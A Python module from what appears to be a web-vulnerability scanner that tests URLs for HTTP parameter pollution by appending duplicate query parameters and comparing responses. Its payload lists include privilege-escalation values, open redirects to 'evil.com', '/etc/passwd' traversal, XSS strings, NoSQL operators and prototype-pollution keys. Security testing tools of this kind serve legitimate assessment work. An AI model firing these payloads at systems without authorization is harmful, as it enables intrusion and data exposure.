"""Parameter pollution exploitation probes."""

from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.analysis.helpers import (
    AUTH_SKIP_PARAMS,
    REDIRECT_PARAM_NAMES,
    decode_candidate_value,
    endpoint_base_key,
    endpoint_signature,
    is_noise_url,
)
from src.analysis.passive.runtime import ResponseCache
from src.recon.common import normalize_url

from ._diff_utils import variant_diff_summary


def parameter_pollution_exploitation(
    priority_urls: list[str], response_cache: ResponseCache, limit: int = 16
) -> list[dict[str, Any]]:
    """Test endpoints for HTTP parameter pollution vulnerabilities."""
    findings: list[dict[str, Any]] = []
    for url in priority_urls:
        if len(findings) >= limit:
            break
        if not url or is_noise_url(url):
            continue
        parsed = urlparse(url)
        raw_query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not raw_query_pairs:
            continue
        baseline = response_cache.get(url)
        if not baseline:
            continue
        for key, value in raw_query_pairs:
            parameter = key.strip().lower()
            if not parameter or parameter in AUTH_SKIP_PARAMS:
                continue
            pollution_values = _all_parameter_pollution_variants(
                parameter, decode_candidate_value(value)
            )
            for pollution_value in pollution_values:
                polluted_url = normalize_url(
                    urlunparse(
                        parsed._replace(
                            query=urlencode([*raw_query_pairs, (key, pollution_value)], doseq=True)
                        )
                    )
                )
                polluted = response_cache.request(
                    polluted_url,
                    headers={"Cache-Control": "no-cache", "X-Parameter-Pollution": "1"},
                )
                if not polluted:
                    continue
                diff = variant_diff_summary(baseline, polluted)
                if not (
                    diff["changed"] or diff["status_changed"] or diff["body_similarity"] < 0.97
                ):
                    continue
                findings.append(
                    {
                        "url": url,
                        "endpoint_key": endpoint_signature(url),
                        "endpoint_base_key": endpoint_base_key(url),
                        "parameter": parameter,
                        "original_value": decode_candidate_value(value),
                        "pollution_value": pollution_value,
                        "mutated_url": polluted_url,
                        "strategy": "duplicate_parameter_append",
                        "signals": [
                            "duplicate_parameter_append",
                            "status_divergence" if diff["status_changed"] else "content_divergence",
                        ],
                        **diff,
                    }
                )
                if diff["status_changed"] or diff["body_similarity"] < 0.85:
                    break
    findings.sort(
        key=lambda item: (not item["status_changed"], not item["content_changed"], item["url"])
    )
    return findings[:limit]


def _parameter_pollution_variant(name: str, value: str) -> str:
    if value.isdigit():
        return str(max(int(value) + 1, 2))
    if name in {"role", "roles", "scope", "permission", "permissions"}:
        return "admin"
    if name in REDIRECT_PARAM_NAMES:
        return "/admin"
    if name in {"include", "expand", "fields", "view", "filter"}:
        return "all"
    return "__dup__"


def _all_parameter_pollution_variants(name: str, value: str) -> list[str]:
    """Generate multiple pollution variants for a parameter."""
    variants: list[str] = []
    primary = _parameter_pollution_variant(name, value)
    if primary:
        variants.append(primary)

    if value.isdigit():
        numeric_val = int(value)
        if numeric_val > 0:
            variants.append(str(numeric_val - 1))
        variants.extend(["0", "999999999", "-1", "1e10", "NaN", "Infinity"])
    elif name in {"role", "roles", "scope", "permission", "permissions"}:
        variants.extend(["superadmin", "root", "owner", "administrator"])
        variants.extend(["admin,user", "admin;user", "admin|user"])
        variants.extend(['["admin"]', '{"role":"admin"}'])
    elif name in REDIRECT_PARAM_NAMES:
        variants.extend(
            ["//evil.com", "https://evil.com", "/../../etc/passwd", "javascript:alert(1)"]
        )
        variants.extend(["data:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)"])
        variants.append("//evil.com%2f..%2f..%2fetc%2fpasswd")
    elif name in {"include", "expand", "fields", "view", "filter"}:
        variants.extend(["*", "all,secret,hidden", "__proto__", "constructor"])
        variants.extend(['{"$ne":null}', '{"$gt":""}'])
        variants.append("password,secret,token,api_key")
    else:
        variants.extend(
            ["__proto__", "constructor", "prototype", value + "__dup__", "", "null", "undefined"]
        )
        variants.extend(["[]", "{}", value + "," + value, value + ";" + value, value + "|" + value])

    seen: set[str] = set()
    unique_variants: list[str] = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            unique_variants.append(v)
    return unique_variants[:8]
